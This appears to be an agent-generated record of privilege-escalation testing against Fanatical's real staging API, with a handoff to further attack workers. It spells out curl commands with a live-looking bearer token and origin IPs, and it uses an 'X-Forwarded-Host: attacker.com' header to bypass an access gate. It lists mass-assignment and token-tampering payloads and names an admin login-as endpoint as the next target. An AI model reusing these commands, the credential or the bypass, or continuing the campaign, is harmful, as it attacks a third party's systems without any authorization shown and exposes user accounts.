# Fanatical apistaging 店面 /api/user/* 角色自更新提权系统性证否（含 adminstaging 跨 app RBAC 判据）

- **code**: fanatical-apistaging-店面-api-user-角色自更新提权系统性证否-含-adminstag
- **kind**: poc
- **category**: privesc
- **component**: Fanatical staging API (fan-api-staging, Express+MongoDB/Redis)
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 本机 Linux，用真实 staging 顾客会话 6af4d16b…fc2e9d 实测约 40 条 /api/user/* 路由：save-dob/save-billing/save-site-preference/set-language/update*notifications 等写路由严格字段白名单，role/roles/isAdmin/permissions/userType/admin/email_confirmed 及嵌套/数组/proto 变体全被丢弃，refresh-auth 恒 role=customer；写入的 dob/rokt/language/billing 在 adminstaging refresh-auth 回显一致（共享用户文档），adminstaging 三条权限路由恒 403。token 首段替换 1/000…001/000…000/admin 均 401 Invalid。atok/code 无法重签发。证伪条件：任一写响应/refresh-auth 出现 role=admin 或 adminstaging 403 变 200。
- **path**: pocs/fanatical-apistaging-店面-api-user-角色自更新提权系统性证否-含-adminstag/poc.txt
- **tags**: fanatical,apistaging,adminstaging,privesc,mass-assignment,rbac,negative
- **created_at**: 2026-11-11T21:32:30.246Z
- **engine**: https://apistaging.fanatical.com

## 描述

给后续 worker 的跳过清单与判据：不要在 apistaging/apistaging2/adminstaging 上重复用 /api/user/{profile,update,me,account,settings} 或 save-*/update* 路由尝试 role 自更新（前者 404，后者白名单）；不要再试 token 首段 ObjectId 替换（401 Invalid）；atok/code 需要服务端已存在的 code 记录。真正仍开着的 admin 面是 GET /api/admin/login-as/{token}（四 app 都存在，RBAC user:log-in-as），需要 generate-admin-login-token（403）或找到 token 生成/泄露。

## 用法

```
后续判据：若 refresh-auth 的 role 不是 customer 或 adminstaging 三条权限路由 403→200，则本阴性不成立。别重复 role 自更新矩阵。
```

## 正文

```
目标: https://apistaging.fanatical.com（Host: apistaging.fanatical.com, 源站 3.33.161.45, 需 X-Forwarded-Host: attacker.com 绕门禁）
凭证: Authorization: Bearer 6af4d16bf80a0b26dc1b6466.7d645aba-12b6-4498-9d8c-3f5d24fc2e9d（role=customer，由 Fandom OAuth 签发）

判据请求（写后回读）:
curl -sk --noproxy '*' --resolve apistaging.fanatical.com:443:3.33.161.45 -H 'Host: apistaging.fanatical.com' -H 'X-Forwarded-Host: attacker.com' -H 'anonid: <uuid>' -H 'X-Forwarded-For: <唯一IP>' -H 'Authorization: Bearer <token>' https://apistaging.fanatical.com/api/user/refresh-auth
→ 200 803B {"_id":"6af4...","role":"customer",...,"token":"<同一token>"}

实测阴性矩阵:
- 404 路由: /api/user/profile|update|me|account|settings、set-up-sharable-wishlist、steam/*、epicurl、request-two-factor；refresh-auth 仅 GET（POST/PUT/PATCH 404）
- 200 写路由且仅白名单字段: save-dob(dob)、save-billing(billing.address1/address2/postalCode)、save-site-preference(preferences.pickAndMixSuggestions)、set-language(language.code)、preference-rokt-ads、update{wishlist,cart}notifications
- 任意 role 载体（role/Role/userRole/user_role/userType/type/level/isAdmin/is_admin/admin:true/roles[]/roles[{name}]/permissions[]/nested user.role/user_traits.role/__proto__/constructor.prototype）→ role 恒 customer
- 跨 app: 同 token 打 adminstaging.fanatical.com:443:3.33.240.98 + Host → /api/admin/users 403 user:view、/api/admin/products/preview/{id}/en 403 product:preview、/api/admin/users/generate-admin-login-token/1 403 user:log-in-as；adminstaging /api/user/refresh-auth 回显同一 dob/rokt/language → 共享用户文档
- token 替换: 1.<uuid> / 000...001.<uuid> / 000...000.<uuid> / admin.<uuid> → 401 Invalid authorization header
- atok/code: {"code":"<任意>"} → 400 No token found；{"token":"x"} → 400 No code passed
- 限流: save-dob 约 10 次后 429，换 XFF/anonid 无效，且跨 app 传播 → 限流键含用户 ID、存储共享

仍开放的入口（交下一条意图）:
GET /api/admin/login-as/{token} 在 apistaging/apistaging2/apiprelive/apitesting 都存在；无鉴权 401，带顾客 token 403 user:log-in-as。需要先拿到 generate-admin-login-token 生成的 token 才能消费。
```
